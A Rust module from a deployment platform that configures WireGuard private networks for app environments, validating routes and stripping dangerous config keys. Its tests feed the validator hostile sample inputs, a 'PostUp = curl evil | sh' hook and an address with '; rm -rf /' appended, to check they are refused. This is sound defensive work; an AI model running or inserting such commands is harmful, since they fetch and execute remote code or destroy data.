//! A private network into the customer's own (Cloud Run's Direct VPC egress, Fly's WireGuard
//! peering): an environment's private network names a WireGuard config (a `roll://` reference to
//! its own environment's secret, bound to the person who set it and read as them at each use)
//! and the routes its code reaches through it, each a name the app connects to and a `host:port`
//! in the customer's network.
//!
//! - A peer container per environment (`roll-apps-peer-…`) holds the tunnel in a network namespace
//!   of its own, with `NET_ADMIN` there and nothing else; one forwarder a route (`socat`, the link
//!   relays' pinned image, in the peer's namespace) answers the route's name on the project
//!   network and connects to its target through the tunnel. The app changes nothing: it connects
//!   to `db.corp.internal:5432` as it would inside the customer's network.
//! - A closed environment's peer answers on its closed network and reaches its endpoint through
//!   a network of its own (`<peer>-out`): the instances, with no route out and no way to add one,
//!   still reach only the routes' names, so the customer's hosts join roll as what it may reach.
//! - A WireGuard config is parsed and written again with only what a peer needs (its key, its
//!   addresses, each peer's key, endpoint, allowed IPs, preshared key and keepalive): `PostUp`
//!   and the other hooks would run any command as root in the peer, `DNS` and `Table` change
//!   what the peer's namespace resolves and routes, and a full tunnel (`0.0.0.0/0`) would send
//!   the peer's own traffic in too.

use crate::{Error, Result};
use serde::{Deserialize, Serialize};
use std::sync::Arc;

/// The most routes an environment's private network has.
pub const MAX_ROUTES: usize = 20;

/// How the tunnel is made (WireGuard today; a Tailscale node is a later kind).
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PeerKind {
    Wireguard,
}

/// One name the app connects to and where in the customer's network it goes.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct Route {
    /// A DNS name on the project network (`db.corp.internal`); the target's port is its port.
    pub name: String,
    /// `host:port` in the customer's network (an address the tunnel routes, or a name its
    /// resolver answers).
    pub target: String,
}

impl Route {
    pub fn port(&self) -> u16 {
        self.target.rsplit_once(':').and_then(|(_, p)| p.parse().ok()).unwrap_or(0)
    }
}

/// An environment's private network as it's stored: the reference, never what it reads.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct PrivateNetwork {
    pub kind: PeerKind,
    /// `roll://ENV/KEY`: the WireGuard config (an `[Interface]` and its `[Peer]`s).
    pub secret: String,
    pub routes: Vec<Route>,
}

/// `private_network` from an environment's PUT body.
pub fn parse(v: &serde_json::Value) -> Result<PrivateNetwork> {
    let bad = |why: &str| Error::BadRequest(format!("private_network: {why}"));
    let o = v.as_object().ok_or_else(|| bad("an object {kind, secret, routes} or null"))?;
    if let Some(k) = o.keys().find(|k| !["kind", "secret", "routes"].contains(&k.as_str())) {
        return Err(bad(&format!("{k} isn't a field")));
    }
    let kind = match o.get("kind").and_then(|k| k.as_str()) {
        None | Some("wireguard") => PeerKind::Wireguard,
        Some("tailscale") => return Err(bad("a Tailscale node isn't a kind yet: a WireGuard config (a Tailscale subnet router's network takes a WireGuard peer through its own exit)")),
        _ => return Err(bad("kind is wireguard")),
    };
    let secret = o.get("secret").and_then(|s| s.as_str()).filter(|s| s.starts_with("roll://") && s.len() <= 512 && !s.contains(char::is_whitespace)).ok_or_else(|| bad("secret is a roll:// reference to roll secrets (the WireGuard config), never the config itself"))?;
    let list = o.get("routes").and_then(|r| r.as_array()).filter(|r| !r.is_empty() && r.len() <= MAX_ROUTES).ok_or_else(|| bad(&format!("routes is 1–{MAX_ROUTES} {{name, target}}")))?;
    let mut routes: Vec<Route> = Vec::new();
    for r in list {
        let name = r.get("name").and_then(|n| n.as_str()).unwrap_or_default().to_ascii_lowercase();
        let target = r.get("target").and_then(|t| t.as_str()).unwrap_or_default().to_string();
        if !valid_name(&name) {
            return Err(bad(&format!("{name:?} isn't a DNS name (letters, digits, - and ., a dot in it: db.corp.internal)")));
        }
        let (host, port) = target.rsplit_once(':').ok_or_else(|| bad(&format!("{target:?} isn't host:port")))?;
        let port: u16 = port.parse().ok().filter(|p| *p > 0).ok_or_else(|| bad(&format!("{target:?}: the port is 1–65535")))?;
        let host = host.trim_start_matches('[').trim_end_matches(']');
        if host.is_empty() || host.len() > 253 || !(host.parse::<std::net::IpAddr>().is_ok() || valid_name(host) || host.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')) {
            return Err(bad(&format!("{target:?}: the host is an address or a name")));
        }
        if routes.iter().any(|x| x.name == name) {
            return Err(bad(&format!("{name} is named twice")));
        }
        // One forwarder a port, all in the peer's namespace: two routes can't share one.
        if routes.iter().any(|x| x.port() == port) {
            return Err(bad(&format!("two routes go to port {port}: each route's port is its own (the peer answers them all)")));
        }
        routes.push(Route { name, target: format!("{host}:{port}") });
    }
    Ok(PrivateNetwork { kind, secret: secret.to_string(), routes })
}

/// A route's name: a DNS name with a dot (`db.corp.internal`), so it never shadows a service's
/// own name on the project network.
fn valid_name(n: &str) -> bool {
    n.len() <= 253
        && n.contains('.')
        && n.split('.').all(|l| !l.is_empty() && l.len() <= 63 && !l.starts_with('-') && !l.ends_with('-') && l.chars().all(|c| c.is_ascii_alphanumeric() || c == '-'))
}

/// A private network's peer: `roll-apps-peer-<service>-<env>` (its forwarders `<that>-<port>`).
pub fn peer_name(service: &str, env: &str) -> String {
    format!("{}peer-{}-{env}", crate::runtime::PREFIX, service.trim_start_matches("svc_"))
}

impl crate::Apps {
    /// `PUT …/environments/{env}/private-network`: checked (the reference names this
    /// environment's secret, bound to `who`; the config it reads is one roll runs; route names
    /// no other service there answers), kept, and put to work now when something is deployed.
    pub async fn set_private_network(self: &Arc<Self>, service: &str, env: &str, body: serde_json::Value, who: crate::integrations::Asker<'_>) -> Result<serde_json::Value> {
        let p = parse(&body)?;
        let (sid, e) = (service.to_string(), env.to_string());
        let (svc, _) = self.db(move |s| Ok((s.service(&sid)?, s.environment(&sid, &e)?))).await?;
        match crate::model::secret_ref_env(&p.secret) {
            Some(Ok(e)) if e == env => {}
            Some(Ok(e)) => return Err(Error::BadRequest(format!("the reference names {e}'s secret: a private network reads its own environment's (roll://{env}/…)"))),
            Some(Err(e)) => return Err(e),
            None => return Err(Error::BadRequest("secret is a roll:// reference".into())),
        }
        // Each name answers one service's route on the project network.
        let (project, e2, mine) = (svc.project.clone(), env.to_string(), service.to_string());
        let taken: Vec<String> = self
            .db(move |s| {
                let mut names = Vec::new();
                for other in s.services(Some(&project))?.into_iter().filter(|o| o.id != mine) {
                    if let Some((q, _)) = s.peering(&other.id, &e2)? {
                        names.extend(q.routes.into_iter().map(|r| r.name));
                    }
                }
                Ok(names)
            })
            .await?;
        if let Some(r) = p.routes.iter().find(|r| taken.contains(&r.name)) {
            return Err(Error::Conflict(format!("{} is another service's route in {env}", r.name)));
        }
        let maker = self.deps.secrets.bind_ref_runtime(who, &svc.project, service, &p.secret, env).await.map_err(|why| Error::Forbidden(format!("{}: {why:#}", p.secret)))?;
        // The config it reads must be one roll runs, before it's kept (said without its text).
        let text = self.deps.secrets.resolve_as(&svc.project, env, service, &p.secret, &maker).await.map_err(|e| Error::BadRequest(format!("{}: {e:#}", p.secret)))?;
        wireguard_config(&text).map_err(|why| Error::BadRequest(format!("{}: {why}", p.secret)))?;
        let (sid, e, q, m) = (service.to_string(), env.to_string(), p.clone(), maker.clone());
        self.db(move |s| s.set_peering(&sid, &e, &q, &m)).await?;
        self.apply_peering(service, env).await;
        self.private_network(service, env).await.map(|v| v.unwrap_or_default())
    }

    /// An environment's private network as the API shows it (its reference, never what it
    /// reads), with whether its peer runs.
    pub async fn private_network(self: &Arc<Self>, service: &str, env: &str) -> Result<Option<serde_json::Value>> {
        let (sid, e) = (service.to_string(), env.to_string());
        let Some((p, _)) = self.db(move |s| s.peering(&sid, &e)).await? else { return Ok(None) };
        let status = self.peer_status.lock().get(&crate::env_key(service, env)).cloned().unwrap_or_else(|| "waiting for a deploy".into());
        Ok(Some(serde_json::json!({ "kind": "wireguard", "secret": p.secret, "routes": p.routes, "status": status })))
    }

    pub async fn delete_private_network(self: &Arc<Self>, service: &str, env: &str) -> Result<()> {
        let (sid, e) = (service.to_string(), env.to_string());
        if !self.db(move |s| s.delete_peering(&sid, &e)).await? {
            return Err(Error::NotFound(format!("{env} has no private network")));
        }
        self.deps.runtime.remove_peer(&peer_name(service, env)).await;
        self.peer_status.lock().remove(&crate::env_key(service, env));
        Ok(())
    }

    /// Its peer running as its settings say (at a deploy, when they change, and each minute on
    /// the owner): its config read as the person who set it, every time.
    pub(crate) async fn apply_peering(self: &Arc<Self>, service: &str, env: &str) {
        let key = crate::env_key(service, env);
        let (sid, e) = (service.to_string(), env.to_string());
        let Ok((svc, row, peering)) = self.db(move |s| Ok((s.service(&sid)?, s.environment(&sid, &e)?, s.peering(&sid, &e)?))).await else { return };
        let Some((p, maker)) = peering else { return };
        // Nothing deployed: nothing on its network to reach it yet.
        if row.active.is_none() {
            return;
        }
        let log = self.logs.sink(format!("env:{service}/{env}"), crate::logs::Stream::System);
        let made = async {
            let text = self.deps.secrets.resolve_as(&svc.project, env, service, &p.secret, &maker).await.map_err(|e| format!("{}: {e:#}", p.secret))?;
            let wg = wireguard_config(&text).map_err(|why| format!("{}: {why}", p.secret))?;
            // A closed environment's instances are on its closed network: the peer answers there,
            // and reaches its endpoint through a network of its own.
            let closed = row.egress.closed();
            let network = if closed { crate::closed_network_name(&svc.project, env) } else { crate::network_name(&svc.project, env) };
            self.deps.runtime.ensure_network(&network, service, closed).await.map_err(|e| format!("{e:#}"))?;
            let name = peer_name(service, env);
            let spec = crate::runtime::PeerSpec {
                out_network: closed.then(|| format!("{name}-out")),
                name,
                service: service.to_string(),
                env: env.to_string(),
                network,
                config: wg.setconf,
                addresses: wg.addresses,
                routes: wg.routes,
                mtu: wg.mtu,
                forwards: p.routes.iter().map(|r| (r.name.clone(), r.port(), r.target.clone())).collect(),
            };
            self.deps.runtime.ensure_peer(&spec).await.map_err(|e| format!("{e:#}"))
        };
        let now = match made.await {
            Ok(()) => "running".to_string(),
            Err(why) => format!("failed: {why}"),
        };
        let was = self.peer_status.lock().insert(key, now.clone());
        if was.as_deref() != Some(now.as_str()) {
            log.line(match now.as_str() {
                "running" => "its private network is up".to_string(),
                why => format!("its private network {why}"),
            });
        }
    }

    /// The owned environments' private networks checked (a peer stopped, a forwarder gone, a
    /// config changed in roll secrets): each minute.
    pub(crate) async fn peering_pass(self: &Arc<Self>) {
        let Ok(all) = self.db(|s| s.peerings()).await else { return };
        for (service, env) in all.into_iter().filter(|(s, _)| self.owns(s)) {
            self.apply_peering(&service, &env).await;
        }
    }
}

/// A WireGuard config as the peer runs it: what `wg setconf` takes (keys and peers), and the
/// interface's addresses, routes (its peers' allowed IPs) and MTU, which `wg-quick` would set.
pub struct WgConfig {
    pub setconf: String,
    pub addresses: Vec<String>,
    pub routes: Vec<String>,
    pub mtu: Option<u16>,
}

impl std::fmt::Debug for WgConfig {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("WgConfig").field("addresses", &self.addresses).field("routes", &self.routes).field("mtu", &self.mtu).finish_non_exhaustive()
    }
}

/// A WireGuard config written again with only what a peer needs; an error names what's refused
/// (never the config's text: it holds a private key).
pub fn wireguard_config(text: &str) -> std::result::Result<WgConfig, String> {
    const INTERFACE: &[&str] = &["privatekey", "address", "listenport", "mtu"];
    const PEER: &[&str] = &["publickey", "presharedkey", "endpoint", "allowedips", "persistentkeepalive"];
    let mut out = WgConfig { setconf: String::new(), addresses: Vec::new(), routes: Vec::new(), mtu: None };
    let (mut section, mut interfaces, mut peers) = (String::new(), 0, 0);
    for line in text.lines() {
        let line = line.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') && line.ends_with(']') {
            section = line[1..line.len() - 1].trim().to_ascii_lowercase();
            match section.as_str() {
                "interface" => interfaces += 1,
                "peer" => peers += 1,
                s => return Err(format!("[{s}] isn't a WireGuard section")),
            }
            out.setconf.push_str(if section == "peer" { "\n[Peer]\n" } else { "[Interface]\n" });
            continue;
        }
        let (written, v) = line.split_once('=').ok_or("a line that isn't key = value")?;
        let (written, v) = (written.trim(), v.trim());
        let k = written.to_ascii_lowercase();
        let allowed = match section.as_str() {
            "interface" => INTERFACE,
            "peer" => PEER,
            _ => return Err("a key before [Interface]".into()),
        };
        if !allowed.contains(&k.as_str()) {
            return Err(match k.as_str() {
                "preup" | "postup" | "predown" | "postdown" => format!("{written} would run a command in the peer: leave it out"),
                "dns" | "table" | "fwmark" | "saveconfig" => format!("{written} changes how the peer resolves or routes: leave it out"),
                _ => format!("{written} isn't a key roll runs"),
            });
        }
        if v.is_empty() || v.len() > 1024 || !v.chars().all(|c| c.is_ascii_graphic() || c == ' ') {
            return Err(format!("{written}'s value is one line of plain text"));
        }
        let cidrs = |what: &str| -> std::result::Result<Vec<String>, String> {
            v.split(',').map(str::trim).map(|c| cidr(c).ok_or_else(|| format!("{what}: {c:?} isn't an address/prefix"))).collect()
        };
        match k.as_str() {
            "address" => out.addresses.extend(cidrs("Address")?),
            "mtu" => out.mtu = Some(v.parse().ok().filter(|m| (576..=9000).contains(m)).ok_or("MTU is 576–9000")?),
            "allowedips" => {
                let ips = cidrs("AllowedIPs")?;
                if ips.iter().any(|r| r == "0.0.0.0/0" || r == "::/0") {
                    return Err("a full tunnel (AllowedIPs 0.0.0.0/0 or ::/0): name your network's ranges".into());
                }
                out.routes.extend(ips.iter().cloned());
                out.setconf.push_str(&format!("AllowedIPs = {}\n", ips.join(", ")));
            }
            "privatekey" | "publickey" | "presharedkey" if !is_key(v) => return Err(format!("{written} isn't a WireGuard key (32 bytes of base64)")),
            _ => {
                let key = match k.as_str() {
                    "privatekey" => "PrivateKey",
                    "listenport" => "ListenPort",
                    "publickey" => "PublicKey",
                    "presharedkey" => "PresharedKey",
                    "endpoint" => "Endpoint",
                    _ => "PersistentKeepalive",
                };
                out.setconf.push_str(&format!("{key} = {v}\n"));
            }
        }
    }
    if interfaces != 1 || peers == 0 || out.addresses.is_empty() {
        return Err("one [Interface] with an Address, and at least one [Peer]".into());
    }
    out.routes.sort();
    out.routes.dedup();
    Ok(out)
}

/// A WireGuard key: 32 bytes as base64 (so `wg` never echoes a malformed one into a log).
fn is_key(v: &str) -> bool {
    use base64::Engine as _;
    base64::engine::general_purpose::STANDARD.decode(v).is_ok_and(|b| b.len() == 32)
}

/// `addr/prefix` checked and written plainly (an address alone is its own /32 or /128).
fn cidr(c: &str) -> Option<String> {
    let (ip, prefix) = c.split_once('/').unwrap_or((c, ""));
    let ip: std::net::IpAddr = ip.parse().ok()?;
    let max = if ip.is_ipv4() { 32 } else { 128 };
    let prefix: u8 = if prefix.is_empty() { max } else { prefix.parse().ok().filter(|p| *p <= max)? };
    Some(format!("{ip}/{prefix}"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn a_wireguard_config_keeps_only_what_a_peer_needs() {
        let conf = "[Interface]\nPrivateKey = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\nAddress = 10.9.0.2/32\n# a comment\n[Peer]\nPublicKey = AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQE=\nEndpoint = vpn.example.com:51820\nAllowedIPs = 10.0.0.0/16, 10.9.0.0/24\nPersistentKeepalive = 25\n";
        let out = wireguard_config(conf).unwrap();
        assert!(out.setconf.starts_with("[Interface]\nPrivateKey = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\n\n[Peer]\nPublicKey = AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQE=\nEndpoint = vpn.example.com:51820\n"), "{}", out.setconf);
        assert_eq!((out.addresses, out.routes), (vec!["10.9.0.2/32".to_string()], vec!["10.0.0.0/16".to_string(), "10.9.0.0/24".to_string()]));
        for (bad, why) in [
            ("PostUp = curl evil | sh", "run a command"),
            ("DNS = 1.1.1.1", "resolves or routes"),
            ("Table = off", "resolves or routes"),
        ] {
            let e = wireguard_config(&conf.replace("# a comment", bad)).unwrap_err();
            assert!(e.contains(why), "{bad}: {e}");
        }
        assert!(wireguard_config(&conf.replace("10.0.0.0/16, 10.9.0.0/24", "0.0.0.0/0")).unwrap_err().contains("full tunnel"));
        assert!(wireguard_config("[Interface]\nPrivateKey = a\nAddress = 10.9.0.2\n").is_err(), "no peer");
        assert!(wireguard_config(&conf.replace("AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQE=", "short")).unwrap_err().contains("isn't a WireGuard key"));
        assert!(wireguard_config(&conf.replace("10.9.0.2/32", "10.9.0.2/32; rm -rf /")).is_err(), "an address is an address");
    }

    #[test]
    fn routes_are_names_with_their_own_ports() {
        let ok = parse(&json!({"kind": "wireguard", "secret": "roll://production/WG", "routes": [{"name": "DB.corp.internal", "target": "10.0.3.4:5432"}]})).unwrap();
        assert_eq!((ok.routes[0].name.as_str(), ok.routes[0].port()), ("db.corp.internal", 5432));
        for body in [
            json!({"kind": "wireguard", "secret": "[Interface]…", "routes": [{"name": "db.corp", "target": "10.0.0.1:5432"}]}),
            json!({"kind": "openvpn", "secret": "roll://p/K", "routes": [{"name": "db.corp", "target": "10.0.0.1:5432"}]}),
            json!({"secret": "roll://p/K", "routes": [{"name": "db", "target": "10.0.0.1:5432"}]}),
            json!({"secret": "roll://p/K", "routes": [{"name": "a.corp", "target": "10.0.0.1:5432"}, {"name": "b.corp", "target": "10.0.0.2:5432"}]}),
            json!({"secret": "roll://p/K", "routes": []}),
            json!({"kind": "tailscale", "secret": "roll://p/K", "routes": [{"name": "db.corp", "target": "10.0.0.1:5432"}]}),
        ] {
            assert!(parse(&body).is_err(), "{body}");
        }
    }
}
